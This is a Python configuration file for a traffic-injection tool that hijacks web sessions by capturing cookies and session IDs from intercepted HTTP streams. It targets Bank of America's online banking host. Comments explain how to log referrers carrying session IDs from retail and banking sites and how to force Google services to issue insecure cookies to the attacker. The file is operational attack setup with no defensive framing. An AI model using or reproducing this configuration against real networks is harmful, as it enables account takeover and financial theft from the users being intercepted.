#!/usr/bin/python

# Python sugar. Ignore this.
__all__ = ["ALWAYS_TARGET", "COMMON_PATHS", "MAX_ATTEMPTS", "SEND_RST", "MAX_TRACK_LEN", "IGNORE_HOSTS", "LOG_REFERERS_WITH", "FULL_BOUNCE_FOR"] 


# This is a list of target sites to always inject into target IP streams.
# They will be injected until either cookies are obtained for them, or
# MAX_ATTEMPTS is reached, whichever comes first.
#
# NOTE: to remove these, you must actually remove the line. Changing True
# to False does nothing.
# 
# Example: 
#ALWAYS_TARGET = {"mail.google.com" : True, 
#                   "www.skype.com" : True,
#                   "yahoo.com" : True,
#                   "live.com" : True,
#                   "www.facebook.com" : True,
#                   "www.livejournal.com" : True}
ALWAYS_TARGET = {"onlinebanking-nw.bankofamerica.com" : True}

# Maximum number of attempts to make per target host for any given IP
MAX_ATTEMPTS = 2

# Send a TCP reset after injecting content? (Usually not needed)
SEND_RST=True

# Garbage sites to ignore. Again, changing True to False will NOT remove
# these hosts. You must remove the line.
IGNORE_HOSTS = {"sb.google.com" : True,
                "ssl.google-analytics.com" : True,
                "www.googleadservices.com" : True}

# Maximum amount of HTTP data to track when attempting to reassemble 
# fragmented headers
MAX_TRACK_LEN = 4096

# Common cookie paths for popular domains. 
COMMON_PATHS = {"mail.google.com" : ["/mail"], 
                 "www.google.com" : ["/accounts"]}


# Log any referrer urls with the following strings in them. This allows
# us to nab session ids used in SSL connections that have links to
# http urls. For several sites, this SessionID is their only authenticated
# protection.
# TODO: Could generalize this to a regex and apply it to all GET urls as 
# well, for sites that auth via insecure GET params and cookies
LOG_REFERERS_WITH = ["newegg.com",
                    "store.apple.com",
                    "bankofamerica.com"]

# Some servers will attempt to make some of their cookies secure, but 
# yet still re-issue insecure versions of their cookies if users access
# the http url. This allows us to redirect these users when we see 
# their https connections, instead of just injecting images. 
# This behavior is especially true of Google services and 
# many Drupal sites: http://drupal.org/node/170310
#
# This option, when combined with listing the same site in
# ALWAYS_TARGET above can also be used to cause multiple-service hosts
# such as Google to actually GENERATE cookies for us for other
# services the user may have accounts for, but is not actively logged 
# into at the time. 
FULL_BOUNCE_FOR = {"mail.google.com" : True,
                 "finance.google.com" : True,
                 "docs.google.com" : True}
FULL_BOUNCE_FOR = {}
